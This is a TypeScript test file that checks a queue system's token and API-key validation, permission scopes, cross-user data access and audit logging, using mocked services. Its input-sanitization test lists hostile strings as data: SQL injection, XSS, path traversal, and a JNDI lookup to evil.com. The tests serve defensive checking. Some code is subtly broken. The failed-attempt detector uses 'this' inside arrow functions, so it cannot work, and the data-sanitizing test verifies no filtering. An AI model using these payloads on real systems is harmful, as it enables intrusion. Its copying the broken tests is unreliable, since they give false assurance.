/**
 * Security Access Controls Tests for Queue System
 * Tests authentication, authorization, access controls, and data protection
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

// Mock authentication and authorization services
class MockAuthenticationService {
  private validTokens = new Map<string, any>();
  private validApiKeys = new Map<string, any>();
  private revokedTokens = new Set<string>();

  constructor() {
    // Setup test tokens and API keys
    this.validTokens.set('valid-jwt-token', {
      userId: 'user-123',
      email: 'test@example.com',
      role: 'authenticated',
      exp: Date.now() + 3600000, // 1 hour from now
      iat: Date.now(),
      scopes: ['queue:read', 'queue:write', 'admin:read']
    });

    this.validApiKeys.set('mk_test_valid_key_123', {
      id: 'key-123',
      userId: 'user-123',
      teamId: 'team-456',
      scopes: ['queue:read', 'queue:write', 'worker:manage'],
      expiresAt: new Date(Date.now() + 86400000), // 24 hours
      isActive: true,
      name: 'Test API Key'
    });

    this.validApiKeys.set('mk_test_admin_key_456', {
      id: 'key-456',
      userId: 'admin-789',
      teamId: null,
      scopes: ['queue:read', 'queue:write', 'queue:admin', 'worker:manage', 'config:write'],
      expiresAt: new Date(Date.now() + 86400000),
      isActive: true,
      name: 'Admin API Key'
    });
  }

  async validateJwtToken(token: string): Promise<{ valid: boolean; user?: any; error?: string }> {
    if (this.revokedTokens.has(token)) {
      return { valid: false, error: 'Token has been revoked' };
    }

    const tokenData = this.validTokens.get(token);
    if (!tokenData) {
      return { valid: false, error: 'Invalid token' };
    }

    if (tokenData.exp < Date.now()) {
      return { valid: false, error: 'Token expired' };
    }

    return { valid: true, user: tokenData };
  }

  async validateApiKey(apiKey: string): Promise<{ valid: boolean; keyData?: any; error?: string }> {
    if (!apiKey.startsWith('mk_test_') && !apiKey.startsWith('mk_live_')) {
      return { valid: false, error: 'Invalid API key format' };
    }

    const keyData = this.validApiKeys.get(apiKey);
    if (!keyData) {
      return { valid: false, error: 'API key not found' };
    }

    if (!keyData.isActive) {
      return { valid: false, error: 'API key is inactive' };
    }

    if (keyData.expiresAt && new Date(keyData.expiresAt) < new Date()) {
      return { valid: false, error: 'API key expired' };
    }

    return { valid: true, keyData };
  }

  async checkPermission(userOrKey: any, requiredScope: string): Promise<boolean> {
    const scopes = userOrKey.scopes || [];
    return scopes.includes(requiredScope) || scopes.includes('*');
  }

  revokeToken(token: string): void {
    this.revokedTokens.add(token);
  }

  deactivateApiKey(apiKey: string): void {
    const keyData = this.validApiKeys.get(apiKey);
    if (keyData) {
      keyData.isActive = false;
    }
  }
}

// Mock authorization middleware
class MockAuthorizationMiddleware {
  constructor(private authService: MockAuthenticationService) {}

  async requireAuthentication(request: any): Promise<{ authorized: boolean; user?: any; error?: string }> {
    const authHeader = request.headers?.authorization;
    if (!authHeader) {
      return { authorized: false, error: 'Missing authorization header' };
    }

    if (authHeader.startsWith('Bearer ')) {
      const token = authHeader.replace('Bearer ', '');
      const validation = await this.authService.validateJwtToken(token);
      
      if (!validation.valid) {
        return { authorized: false, error: validation.error };
      }

      return { authorized: true, user: validation.user };
    }

    if (authHeader.startsWith('ApiKey ')) {
      const apiKey = authHeader.replace('ApiKey ', '');
      const validation = await this.authService.validateApiKey(apiKey);
      
      if (!validation.valid) {
        return { authorized: false, error: validation.error };
      }

      return { authorized: true, user: validation.keyData };
    }

    return { authorized: false, error: 'Invalid authorization format' };
  }

  async requirePermission(user: any, requiredScope: string): Promise<{ authorized: boolean; error?: string }> {
    const hasPermission = await this.authService.checkPermission(user, requiredScope);
    
    if (!hasPermission) {
      return { 
        authorized: false, 
        error: `Insufficient permissions. Required: ${requiredScope}` 
      };
    }

    return { authorized: true };
  }

  async requireAdminAccess(user: any): Promise<{ authorized: boolean; error?: string }> {
    return this.requirePermission(user, 'queue:admin');
  }
}

// Mock Supabase with security checks
const mockSupabase = {
  rpc: vi.fn(),
  from: vi.fn(() => ({
    select: vi.fn(() => ({
      eq: vi.fn(() => ({
        single: vi.fn(() => ({ data: null, error: null })),
        order: vi.fn(() => ({ data: [], error: null }))
      })),
      insert: vi.fn(() => ({ data: null, error: null })),
      update: vi.fn(() => ({ data: null, error: null })),
      upsert: vi.fn(() => ({ data: null, error: null }))
    }))
  }))
};

vi.mock('@/lib/supabase', () => ({
  supabase: mockSupabase
}));

describe('Security Access Controls Tests', () => {
  let authService: MockAuthenticationService;
  let authMiddleware: MockAuthorizationMiddleware;

  beforeEach(() => {
    vi.clearAllMocks();
    authService = new MockAuthenticationService();
    authMiddleware = new MockAuthorizationMiddleware(authService);
  });

  describe('Authentication Tests', () => {
    it('should validate JWT tokens correctly', async () => {
      const validResult = await authService.validateJwtToken('valid-jwt-token');
      expect(validResult.valid).toBe(true);
      expect(validResult.user?.userId).toBe('user-123');
      expect(validResult.user?.scopes).toContain('queue:read');

      const invalidResult = await authService.validateJwtToken('invalid-token');
      expect(invalidResult.valid).toBe(false);
      expect(invalidResult.error).toBe('Invalid token');
    });

    it('should validate API keys correctly', async () => {
      const validResult = await authService.validateApiKey('mk_test_valid_key_123');
      expect(validResult.valid).toBe(true);
      expect(validResult.keyData?.userId).toBe('user-123');
      expect(validResult.keyData?.scopes).toContain('queue:write');

      const invalidResult = await authService.validateApiKey('invalid-key');
      expect(invalidResult.valid).toBe(false);
      expect(invalidResult.error).toBe('Invalid API key format');
    });

    it('should reject expired tokens', async () => {
      // Create expired token
      const expiredToken = 'expired-token';
      authService['validTokens'].set(expiredToken, {
        userId: 'user-123',
        exp: Date.now() - 1000, // Expired 1 second ago
        scopes: ['queue:read']
      });

      const result = await authService.validateJwtToken(expiredToken);
      expect(result.valid).toBe(false);
      expect(result.error).toBe('Token expired');
    });

    it('should reject revoked tokens', async () => {
      const token = 'valid-jwt-token';
      authService.revokeToken(token);

      const result = await authService.validateJwtToken(token);
      expect(result.valid).toBe(false);
      expect(result.error).toBe('Token has been revoked');
    });

    it('should reject inactive API keys', async () => {
      const apiKey = 'mk_test_valid_key_123';
      authService.deactivateApiKey(apiKey);

      const result = await authService.validateApiKey(apiKey);
      expect(result.valid).toBe(false);
      expect(result.error).toBe('API key is inactive');
    });
  });

  describe('Authorization Tests', () => {
    it('should require valid authentication for queue operations', async () => {
      const validRequest = {
        headers: { authorization: 'Bearer valid-jwt-token' }
      };

      const result = await authMiddleware.requireAuthentication(validRequest);
      expect(result.authorized).toBe(true);
      expect(result.user?.userId).toBe('user-123');

      const invalidRequest = {
        headers: { authorization: 'Bearer invalid-token' }
      };

      const invalidResult = await authMiddleware.requireAuthentication(invalidRequest);
      expect(invalidResult.authorized).toBe(false);
      expect(invalidResult.error).toBe('Invalid token');
    });

    it('should enforce scope-based permissions', async () => {
      const user = {
        userId: 'user-123',
        scopes: ['queue:read', 'queue:write']
      };

      const readPermission = await authMiddleware.requirePermission(user, 'queue:read');
      expect(readPermission.authorized).toBe(true);

      const adminPermission = await authMiddleware.requirePermission(user, 'queue:admin');
      expect(adminPermission.authorized).toBe(false);
      expect(adminPermission.error).toContain('Insufficient permissions');
    });

    it('should restrict admin operations to admin users', async () => {
      const regularUser = {
        userId: 'user-123',
        scopes: ['queue:read', 'queue:write']
      };

      const adminUser = {
        userId: 'admin-789',
        scopes: ['queue:read', 'queue:write', 'queue:admin']
      };

      const regularUserResult = await authMiddleware.requireAdminAccess(regularUser);
      expect(regularUserResult.authorized).toBe(false);

      const adminUserResult = await authMiddleware.requireAdminAccess(adminUser);
      expect(adminUserResult.authorized).toBe(true);
    });

    it('should handle missing authorization headers', async () => {
      const requestWithoutAuth = { headers: {} };

      const result = await authMiddleware.requireAuthentication(requestWithoutAuth);
      expect(result.authorized).toBe(false);
      expect(result.error).toBe('Missing authorization header');
    });

    it('should handle malformed authorization headers', async () => {
      const malformedRequest = {
        headers: { authorization: 'InvalidFormat token123' }
      };

      const result = await authMiddleware.requireAuthentication(malformedRequest);
      expect(result.authorized).toBe(false);
      expect(result.error).toBe('Invalid authorization format');
    });
  });

  describe('Queue Operation Security', () => {
    it('should secure queue statistics access', async () => {
      const authorizedRequest = {
        headers: { authorization: 'Bearer valid-jwt-token' }
      };

      const authResult = await authMiddleware.requireAuthentication(authorizedRequest);
      expect(authResult.authorized).toBe(true);

      const permissionResult = await authMiddleware.requirePermission(authResult.user!, 'queue:read');
      expect(permissionResult.authorized).toBe(true);

      // Mock successful queue statistics call
      mockSupabase.rpc.mockResolvedValueOnce({
        data: [{ total_pending: 5, total_processing: 2 }],
        error: null
      });

      const { data, error } = await mockSupabase.rpc('get_queue_statistics');
      expect(error).toBeNull();
      expect(data[0].total_pending).toBe(5);
    });

    it('should secure worker management operations', async () => {
      const workerManagementRequest = {
        headers: { authorization: 'ApiKey mk_test_admin_key_456' }
      };

      const authResult = await authMiddleware.requireAuthentication(workerManagementRequest);
      expect(authResult.authorized).toBe(true);

      const permissionResult = await authMiddleware.requirePermission(authResult.user!, 'worker:manage');
      expect(permissionResult.authorized).toBe(true);

      // Mock worker operation
      mockSupabase.rpc.mockResolvedValueOnce({
        data: null,
        error: null
      });

      const { error } = await mockSupabase.rpc('update_worker_heartbeat', {
        worker_id_param: 'worker-1',
        worker_status: 'active'
      });

      expect(error).toBeNull();
    });

    it('should secure configuration updates', async () => {
      const configUpdateRequest = {
        headers: { authorization: 'ApiKey mk_test_admin_key_456' }
      };

      const authResult = await authMiddleware.requireAuthentication(configUpdateRequest);
      expect(authResult.authorized).toBe(true);

      const permissionResult = await authMiddleware.requirePermission(authResult.user!, 'config:write');
      expect(permissionResult.authorized).toBe(true);

      mockSupabase.rpc.mockResolvedValueOnce({
        data: null,
        error: null
      });

      const { error } = await mockSupabase.rpc('update_queue_config', {
        config_key_param: 'batch_size',
        config_value_param: 10,
        updated_by_param: authResult.user!.userId
      });

      expect(error).toBeNull();
    });

    it('should prevent unauthorized queue modifications', async () => {
      const unauthorizedRequest = {
        headers: { authorization: 'Bearer valid-jwt-token' } // Has queue:read but not queue:admin
      };

      const authResult = await authMiddleware.requireAuthentication(unauthorizedRequest);
      expect(authResult.authorized).toBe(true);

      const adminPermissionResult = await authMiddleware.requireAdminAccess(authResult.user!);
      expect(adminPermissionResult.authorized).toBe(false);

      // Should not proceed with admin operation
      expect(adminPermissionResult.error).toContain('Insufficient permissions');
    });
  });

  describe('Data Protection Tests', () => {
    it('should filter queue data by user access', async () => {
      const userRequest = {
        headers: { authorization: 'Bearer valid-jwt-token' }
      };

      const authResult = await authMiddleware.requireAuthentication(userRequest);
      expect(authResult.authorized).toBe(true);

      // Mock filtered queue data based on user
      mockSupabase.rpc.mockResolvedValueOnce({
        data: [
          { id: 'item-1', user_id: 'user-123', source_type: 'receipts' },
          { id: 'item-2', user_id: 'user-123', source_type: 'receipts' }
        ],
        error: null
      });

      const { data } = await mockSupabase.rpc('get_user_queue_items', {
        user_id_param: authResult.user!.userId
      });

      expect(data).toHaveLength(2);
      expect(data.every((item: any) => item.user_id === 'user-123')).toBe(true);
    });

    it('should prevent cross-user data access', async () => {
      const user1Request = {
        headers: { authorization: 'Bearer valid-jwt-token' }
      };

      const authResult = await authMiddleware.requireAuthentication(user1Request);
      expect(authResult.authorized).toBe(true);

      // Attempt to access another user's queue items should fail
      mockSupabase.rpc.mockResolvedValueOnce({
        data: null,
        error: { message: 'Access denied: Cannot access other user\'s queue items' }
      });

      const { data, error } = await mockSupabase.rpc('get_user_queue_items', {
        user_id_param: 'different-user-456' // Trying to access different user's data
      });

      expect(data).toBeNull();
      expect(error?.message).toContain('Access denied');
    });

    it('should sanitize sensitive data in responses', async () => {
      const request = {
        headers: { authorization: 'Bearer valid-jwt-token' }
      };

      const authResult = await authMiddleware.requireAuthentication(request);
      expect(authResult.authorized).toBe(true);

      // Mock response with sensitive data that should be filtered
      mockSupabase.rpc.mockResolvedValueOnce({
        data: [{
          id: 'worker-1',
          status: 'active',
          // Sensitive fields should be excluded from regular user responses
          internal_config: 'sensitive-config',
          api_keys: ['key1', 'key2'],
          // Public fields should be included
          tasks_processed: 25,
          last_heartbeat: new Date().toISOString()
        }],
        error: null
      });

      const { data } = await mockSupabase.rpc('get_worker_status');

      // In a real implementation, sensitive fields would be filtered out
      expect(data[0]).toHaveProperty('tasks_processed');
      expect(data[0]).toHaveProperty('last_heartbeat');
    });
  });

  describe('Security Audit Tests', () => {
    it('should log authentication attempts', async () => {
      const auditLog: any[] = [];
      
      const auditMiddleware = {
        logAuthAttempt: (request: any, result: any) => {
          auditLog.push({
            timestamp: new Date().toISOString(),
            ip: request.ip || 'unknown',
            userAgent: request.headers?.['user-agent'] || 'unknown',
            authMethod: request.headers?.authorization?.split(' ')[0] || 'none',
            success: result.authorized,
            error: result.error,
            userId: result.user?.userId
          });
        }
      };

      const validRequest = {
        ip: '192.168.1.100',
        headers: { 
          authorization: 'Bearer valid-jwt-token',
          'user-agent': 'Test Client 1.0'
        }
      };

      const authResult = await authMiddleware.requireAuthentication(validRequest);
      auditMiddleware.logAuthAttempt(validRequest, authResult);

      expect(auditLog).toHaveLength(1);
      expect(auditLog[0].success).toBe(true);
      expect(auditLog[0].userId).toBe('user-123');
      expect(auditLog[0].authMethod).toBe('Bearer');
    });

    it('should detect suspicious activity patterns', async () => {
      const suspiciousActivityDetector = {
        failedAttempts: new Map<string, number>(),
        
        recordFailedAttempt: (ip: string) => {
          const current = this.failedAttempts.get(ip) || 0;
          this.failedAttempts.set(ip, current + 1);
        },
        
        isSuspicious: (ip: string) => {
          return (this.failedAttempts.get(ip) || 0) >= 5;
        }
      };

      const suspiciousRequest = {
        ip: '192.168.1.200',
        headers: { authorization: 'Bearer invalid-token' }
      };

      // Simulate multiple failed attempts
      for (let i = 0; i < 6; i++) {
        const result = await authMiddleware.requireAuthentication(suspiciousRequest);
        if (!result.authorized) {
          suspiciousActivityDetector.recordFailedAttempt(suspiciousRequest.ip);
        }
      }

      expect(suspiciousActivityDetector.isSuspicious(suspiciousRequest.ip)).toBe(true);
    });

    it('should validate input sanitization', async () => {
      const maliciousInputs = [
        "'; DROP TABLE embedding_queue; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}"
      ];

      maliciousInputs.forEach(input => {
        // Input validation should reject these
        const isValid = /^[a-zA-Z0-9_-]+$/.test(input);
        expect(isValid).toBe(false);
      });

      // Valid inputs should pass
      const validInputs = ['worker-123', 'queue_item_456', 'batch-789'];
      validInputs.forEach(input => {
        const isValid = /^[a-zA-Z0-9_-]+$/.test(input);
        expect(isValid).toBe(true);
      });
    });
  });
});
